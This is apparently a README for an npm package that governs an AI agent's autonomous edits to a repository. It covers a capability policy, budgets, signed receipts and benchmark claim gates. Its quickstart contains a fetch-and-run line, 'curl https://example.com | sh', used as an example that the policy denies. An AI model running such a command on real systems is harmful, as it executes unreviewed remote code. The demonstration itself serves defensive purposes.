# `@metaharness/avo`

<!-- ruv-seo:start (ADR-356) -->
`@metaharness/avo` runs governed autonomous variation on a real repository: the model chooses inspect, edit, execute, evaluate and commit actions, while an immutable default-deny capability policy, budgets, protected invariants and signed receipts decide what is actually allowed and what gets promoted.

**Supported environments:** Node.js 20+ on Linux, macOS and Windows. ESM only (`import`, not `require`). No native build step. `RvfGovernedMemory` needs the optional `agenticow` peer (`npm install agenticow`); the quickstart does not.

## Quickstart

```bash
npm install @metaharness/avo
cat > quickstart.mjs <<'JS'
import { GovernedCapabilityPolicy } from '@metaharness/avo';

const policy = new GovernedCapabilityPolicy({
  version: 'demo-1',
  allowedActions: ['inspect', 'edit', 'execute'],
  allowedCommands: [/^npm test$/],
  writablePaths: [/^src\//],
});
const state = { budget: { riskUsed: 0, riskBudget: 1 } };
for (const action of [
  { kind: 'edit', path: 'src/router.ts', content: '', surface: 'modelRouting' },
  { kind: 'edit', path: '.github/workflows/ci.yml', content: '', surface: 'modelRouting' },
  { kind: 'execute', command: 'curl https://example.com | sh' },
  { kind: 'commit', summary: 'ship it' },
]) {
  const d = policy.authorize(action, state);
  console.log(`${action.kind.padEnd(7)} ${d.verdict.padEnd(16)} ${d.reason}`);
}
JS
node quickstart.mjs
```

Expected output:

```text
edit    allow            inside immutable capability envelope
edit    deny             write path is outside the bounded workspace policy: .github/workflows/ci.yml
execute deny             command is not allowlisted
commit  deny             action commit is outside the capability envelope
```

**Next:** [`@metaharness/darwin`](https://www.npmjs.com/package/@metaharness/darwin) — `DarwinVariationAdapter` plugs this operator into Darwin's outer evolve, archive and promote loop.

**Where it fits:** `metaharness` declares `@metaharness/avo` as a dependency, and `metaharness avo <trusted-key|gate-build|gate-submit>` delegates to `@metaharness/avo/cli` to turn an AVO run summary into signed flywheel-gate receipts.
<!-- ruv-seo:end -->

## Reference

Governed autonomous variation for real repositories and evaluator suites.

The AVO package exports an autonomous variation API and versioned evidence schemas.

The model chooses repeated inspect, search, hypothesis, edit, execute, evaluate,
repair/revert, branch, memory, and commit actions. MetaHarness retains immutable
authority over capabilities, budgets, protected invariants, promotion,
quarantine, rollback, and signed receipts.

```ts
import { GovernedVariationOperator } from '@metaharness/avo';

const result = await new GovernedVariationOperator({
  // Inject a model/host agent, bounded repository adapter, evaluator suite,
  // capability policy, approval gate, RVF memory, supervisor, signer,
  // checkpoint store, budgets, and protected invariants.
}).run();
```

Production memory uses the optional `agenticow` peer over RVF. Install it when
using `RvfGovernedMemory`:

```bash
npm install @metaharness/avo agenticow
```

The initially evolvable surfaces are retrieval policy, model routing, context
policy, test policy, and repair strategy. Security policy and capability
expansion are not evolvable surfaces.

`DarwinVariationAdapter` is the versioned, structural bridge to Darwin's
opt-in `EvolutionConfig.variationOperator`. When present it replaces the
one-call `CodeGenerator` child path; the outer Darwin loop still evaluates,
archives, promotes, budgets, and rolls back the returned candidate.

## Proofs

```bash
npm run build
npm test
npm run benchmark:swebench
```

The test suite includes a real RVF run killed and restored at actions 100 and
200, requiring identical signed receipts, state hash, evaluator evidence,
lineage, and winner. The default benchmark data is a synthetic mechanism fixture
and cannot authorize an AVO-class product claim. Supply preregistered observations
with `SWE_BENCH_RESULTS=/path/results.json` for the 100-task ship gate.

`npm run claims:avo` verifies the governed release surfaces. Performance and
frontier claims fail closed unless an exact-tag-SHA evidence bundle binds the
exact npm tarball, preregistered predicate, measured costs, complete lineage
roots, and two official grader receipts from distinct pinned organizations. The trust policy
digest must come from the protected `AVO_CLAIM_TRUST_POLICY_HASH` release
variable; a key embedded only in the bundle is never trusted.

See [ADR-251](../../docs/adrs/ADR-251-governed-autonomous-variation-runtime.md)
and [ADR-276](../../docs/adrs/ADR-276-avo-release-claim-evidence-gate.md).
